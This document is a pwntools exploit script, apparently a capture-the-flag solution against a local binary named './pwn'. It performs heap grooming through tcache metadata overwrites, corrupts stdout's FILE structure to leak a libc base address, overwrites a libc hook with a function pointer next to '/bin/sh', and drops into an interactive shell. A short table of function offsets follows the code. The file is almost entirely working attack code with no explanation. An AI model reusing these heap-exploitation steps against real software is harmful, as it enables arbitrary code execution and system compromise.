from pwn import *
context.log_level='debug'
def f(size,c=b'\0'*8,escape="A"):
	p.sendlineafter("Message:\n",str(size).encode('utf8'))
	p.sendafter("Content:\n",c)
	p.sendafter("?\n",escape)
def bits(index,k=1):
	bitmap=[0]*0x80
	bitmap[index*2]=k
	bitmap=bytes(bitmap)
	return bitmap

p=process("./pwn")

add=376
free=388
read_int=400

f(100,b"A",b"1"*0x30+b"A"*8+p64(add)+p64(read_int)+p64(free)+p64(0))
p.sendafter("Content:\n",b"A\n")
p.send("A"*0x10+'\x10')

f(0xc8+0x90,p64(0x21)*((0x90+0xc8)//8))
f(0x98)
f(0x288,bits(8,8))
f(0x298,p64(0x21)*(0x200//8))
f(0x98)
f(0x288,bits(20,1)+p64(0)*20+b'\x10\xac')

f(0xa8)
f(0x408,b'\0'*0x18+p64(0x671))
f(0x3f8,p64(0x21)*(0x3f0//8))
f(0xb8)
f(0xc8)
f(0x288,bits(9,1)+p64(0)*9+b'\x20\xb0')
f(0xa8,b"\0"*0x10)# 
f(0x699)#0x7ffff7fad3f0
f(0x288,bits(10,1)+p64(0)*10+b'\xf0\xab')
f(0xb8,b'\0'*0x18+p64(0x1c1)+b'\xf0\xd3')
f(0x288,bits(20,8))
f(0x158)
f(0x158,p64(0)*0x21+p64(0x1f1))
f(0x288,bits(30,1)+p64(0)*30+b'\x00\xd5')
#
p.sendlineafter("Message:\n",str(0x1f8).encode('utf8'))
p.sendafter("Content:\n",b'\0'*0x1a0+p64(0x1802)+p64(0)*3+b'\0')
p.read(0x8)
base=u64(p.read(0x8))-(0x7ffff7fac980-0x7ffff7dc1000)
log.warning(hex(base))
p.sendlineafter("?\n","Get libc-base")

f(0x288,bits(30,1)+p64(0)*30+p64(0x1eeb20+base))
p.sendlineafter("Message:\n",str(0x1f8).encode('utf8'))
p.sendafter("Content:\n",b'/bin/sh\0'+p64(base+0x55410))
#gdb.attach(p,'b *0x7ffff7e0ccc9')

p.interactive()
"""
Function PUTS: 21
 Pin_0: 50
 Pin_1: 76
 Pin_2: 116
Pin_4: 177
 pin_5 238
Function Vul: 244
 Pin_6 262
 DDD 0x109
Function logo: 280
function_cmp_rdi_rsi: 347
function_add: 376
function_free: 388
function_read_int: 400

"""
